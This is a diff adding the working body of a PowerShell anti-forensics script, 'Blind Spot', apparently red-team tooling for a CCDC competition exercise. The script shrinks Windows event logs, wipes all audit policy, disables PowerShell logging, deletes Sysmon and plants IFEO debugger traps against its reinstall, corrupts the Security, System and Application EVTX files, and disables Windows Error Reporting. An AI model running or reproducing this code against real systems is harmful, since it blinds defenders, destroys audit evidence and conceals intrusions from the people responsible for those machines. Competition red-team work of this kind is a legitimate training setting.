@@ -79,5 +79,238 @@ Write-Warn " CCDC Phase 3 — Evasion: Blind Spot"
 Write-Warn "================================================================"
 Write-Host ""
 
-# TODO: implement
-Write-Warn "STUB — not yet implemented. See Phase3_Windows_Plan.md for full design."
+# ============================================================
+# Layer 1 — Event Log Size Destruction
+# ============================================================
+Write-Section "Layer 1 — Event Log Size Destruction"
+
+$LogChannels = @(
+    "Security",
+    "System",
+    "Application",
+    "Microsoft-Windows-PowerShell/Operational",
+    "Windows PowerShell",
+    "Microsoft-Windows-Sysmon/Operational"
+)
+
+foreach ($chan in $LogChannels) {
+    try {
+        # Minimum wevtutil /ms is 1048576 (1 MB); 65536 is rejected with "parameter incorrect"
+        & "$env:SystemRoot\System32\wevtutil.exe" sl "$chan" /ms:1048576 /rt:false /ab:false 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Success "Log shrunken: $chan -> 1 MB (rolls over fast)"
+        } else {
+            Write-Warn "wevtutil sl failed for $chan (exit $LASTEXITCODE) — channel may not exist"
+        }
+    } catch {
+        Write-Warn "Could not resize $chan : $_"
+    }
+}
+
+# ============================================================
+# Layer 2 — Audit Policy Wipe
+# ============================================================
+Write-Section "Layer 2 — Audit Policy Wipe"
+
+& "$env:SystemRoot\System32\auditpol.exe" /clear /y | Out-Null
+if ($LASTEXITCODE -eq 0) {
+    Write-Success "auditpol /clear — all audit policies cleared"
+} else {
+    Write-Err "auditpol /clear failed (exit $LASTEXITCODE)"
+}
+
+& "$env:SystemRoot\System32\auditpol.exe" /set /subcategory:"*" /success:disable /failure:disable | Out-Null
+if ($LASTEXITCODE -eq 0) {
+    Write-Success "auditpol — all subcategories disabled (success + failure)"
+} else {
+    Write-Err "auditpol /set failed (exit $LASTEXITCODE)"
+}
+
+# ============================================================
+# Layer 3 — PowerShell Logging Destruction
+# ============================================================
+Write-Section "Layer 3 — PowerShell Logging Destruction"
+
+$PSPolicyBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+
+$PSLoggingKeys = @(
+    @{ Path = "$PSPolicyBase\ScriptBlockLogging"; Name = "EnableScriptBlockLogging" },
+    @{ Path = "$PSPolicyBase\ModuleLogging";      Name = "EnableModuleLogging"      },
+    @{ Path = "$PSPolicyBase\Transcription";      Name = "EnableTranscripting"      }
+)
+
+foreach ($entry in $PSLoggingKeys) {
+    try {
+        if (-not (Test-Path $entry.Path)) {
+            New-Item -Path $entry.Path -Force | Out-Null
+        }
+        Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value 0 -Type DWORD -Force
+        Write-Success "Disabled: $($entry.Name)"
+    } catch {
+        Write-Warn "Could not set $($entry.Name): $_"
+    }
+}
+
+# Clear module logging allow-list so nothing is selectively logged
+try {
+    $modPath = "$PSPolicyBase\ModuleLogging"
+    if (-not (Test-Path $modPath)) { New-Item -Path $modPath -Force | Out-Null }
+    Set-ItemProperty -Path $modPath -Name "ModuleNames" -Value @() -Type MultiString -Force
+    Write-Success "ModuleNames allow-list cleared"
+} catch {
+    Write-Warn "Could not clear ModuleNames: $_"
+}
+
+# ============================================================
+# Layer 4 — Sysmon Removal + IFEO Intercept
+# ============================================================
+Write-Section "Layer 4 — Sysmon Removal"
+
+$SysmonServiceNames = @("Sysmon", "Sysmon64", "SysmonDrv")
+$SysmonFound        = $false
+
+foreach ($svcName in $SysmonServiceNames) {
+    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
+    if ($svc) {
+        $SysmonFound = $true
+        try {
+            Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
+            & "$env:SystemRoot\System32\sc.exe" delete $svcName | Out-Null
+            Write-Success "Stopped and deleted service: $svcName"
+        } catch {
+            Write-Warn "Could not remove service $svcName : $_"
+        }
+    }
+}
+
+# Remove Sysmon binaries from C:\Windows\
+$SysmonBins = Get-ChildItem -Path "$env:SystemRoot\" -Filter "sysmon*.exe" -ErrorAction SilentlyContinue
+foreach ($bin in $SysmonBins) {
+    try {
+        Remove-Item -Path $bin.FullName -Force
+        Write-Success "Deleted binary: $($bin.FullName)"
+    } catch {
+        Write-Warn "Could not delete $($bin.FullName): $_"
+    }
+}
+
+if (-not $SysmonFound) {
+    Write-Info "Sysmon not detected on this host — placing IFEO traps preemptively"
+}
+
+# IFEO intercept — blocks reinstallation attempts regardless of whether Sysmon was present
+$IFEOStubPath = "$env:SystemRoot\Temp\svchost_compat.exe"
+try {
+    # Create a zero-byte stub with a convincing name
+    if (-not (Test-Path $IFEOStubPath)) {
+        [System.IO.File]::WriteAllBytes($IFEOStubPath, [byte[]]@())
+        Write-Info "IFEO stub created at $IFEOStubPath"
+    }
+} catch {
+    Write-Warn "Could not create IFEO stub: $_"
+}
+
+$IFEOBase   = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+$IFEOTargets = @("sysmon.exe", "sysmon64.exe")
+
+foreach ($target in $IFEOTargets) {
+    try {
+        $keyPath = "$IFEOBase\$target"
+        if (-not (Test-Path $keyPath)) {
+            New-Item -Path $keyPath -Force | Out-Null
+        }
+        Set-ItemProperty -Path $keyPath -Name "Debugger" -Value $IFEOStubPath -Type String -Force
+        Write-Success "IFEO trap set for $target -> $IFEOStubPath"
+    } catch {
+        Write-Warn "Could not set IFEO for $target : $_"
+    }
+}
+
+# ============================================================
+# Layer 5 — EVTX Journal Corruption
+# ============================================================
+Write-Section "Layer 5 — EVTX Journal Corruption"
+
+try {
+    Stop-Service -Name EventLog -Force -ErrorAction Stop
+    Write-Info "EventLog service stopping..."
+
+    $deadline = (Get-Date).AddSeconds(10)
+    while ((Get-Service -Name EventLog).Status -ne 'Stopped' -and (Get-Date) -lt $deadline) {
+        Start-Sleep -Milliseconds 500
+    }
+
+    $evtxDir    = "$env:SystemRoot\System32\winevt\Logs"
+    $evtxFiles  = @("Security.evtx", "System.evtx", "Application.evtx")
+    $nullHeader = [byte[]](0x00, 0x00, 0x00, 0x00)
+
+    foreach ($fname in $evtxFiles) {
+        $fpath = Join-Path $evtxDir $fname
+        if (Test-Path $fpath) {
+            try {
+                [System.IO.File]::WriteAllBytes($fpath, $nullHeader)
+                Write-Success "Corrupted EVTX header: $fname"
+            } catch {
+                Write-Warn "Could not corrupt $fname : $_"
+            }
+        } else {
+            Write-Warn "$fname not found at expected path"
+        }
+    }
+
+    Start-Service -Name EventLog -ErrorAction SilentlyContinue
+    Write-Success "EventLog restarted — empty fresh logs created"
+} catch {
+    Write-Warn "EVTX corruption block failed: $_ — EventLog may still be stopped"
+    # Attempt to restart EventLog regardless
+    Start-Service -Name EventLog -ErrorAction SilentlyContinue
+}
+
+# ============================================================
+# Layer 6 — Windows Error Reporting Disable
+# ============================================================
+Write-Section "Layer 6 — Windows Error Reporting Disable"
+
+$WerPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting"
+$WerSvcPath    = "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"
+
+try {
+    if (-not (Test-Path $WerPolicyPath)) {
+        New-Item -Path $WerPolicyPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $WerPolicyPath -Name "Disabled" -Value 1 -Type DWORD -Force
+    Write-Success "WER policy key set: Disabled=1"
+} catch {
+    Write-Warn "Could not set WER policy key: $_"
+}
+
+try {
+    Set-ItemProperty -Path $WerSvcPath -Name "Disabled" -Value 1 -Type DWORD -Force
+    Write-Success "WER service key set: Disabled=1"
+} catch {
+    Write-Warn "Could not set WER service key: $_"
+}
+
+try {
+    Stop-Service -Name WerSvc -Force -ErrorAction SilentlyContinue
+    Set-Service  -Name WerSvc -StartupType Disabled -ErrorAction SilentlyContinue
+    Write-Success "WerSvc stopped and disabled"
+} catch {
+    Write-Warn "Could not stop/disable WerSvc: $_"
+}
+
+# ============================================================
+# Done
+# ============================================================
+Write-Host ""
+Write-Success "================================================================"
+Write-Success " Blind Spot complete — logging visibility destroyed"
+Write-Success "================================================================"
+Write-Host ""
+Write-Info "Remediation requires:"
+Write-Info "  auditpol /restore (from a saved backup) or reconfigure each subcategory"
+Write-Info "  wevtutil sl <channel> /ms:<original> to restore log sizes"
+Write-Info "  Remove HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell keys"
+Write-Info "  Remove IFEO keys for sysmon.exe and sysmon64.exe"
+Write-Info "  Reinstall Sysmon after removing IFEO traps"
+Write-Info "  Enable and start WerSvc"
